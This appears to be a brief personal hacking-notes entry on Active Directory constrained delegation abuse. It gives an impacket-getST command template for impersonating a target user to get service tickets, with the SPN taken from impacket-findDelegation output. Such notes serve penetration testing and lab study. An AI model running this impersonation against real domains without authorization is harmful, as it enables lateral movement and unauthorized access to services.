# active directory  delegation constrained
can authenticate to any service on the network.
use `impacket-getST` to get service ticket.
get SPN from the last column of `impacket-findDelegation` "DelegationRightsTo".
```bash
impacket-getST -spn SERVICE/HOSTNAME_YOU_HAVE_DELEGATION_RIGHTS_TO.FQDN -impersonate TARGET_USER DOMAIN/USERNAME:PASSWORD
```

` zet/20221003151125/README.md `

# Related

- [20221007220451](/zet/20221007220451/README.md) hacking notes node
- [20221003151127](/zet/20221003151127/README.md) active directory  delegation
- ~/kb/hacking/windows/windows-active-directory-and-privilege-information.md

Tags:

    #hacking #windows #windows 
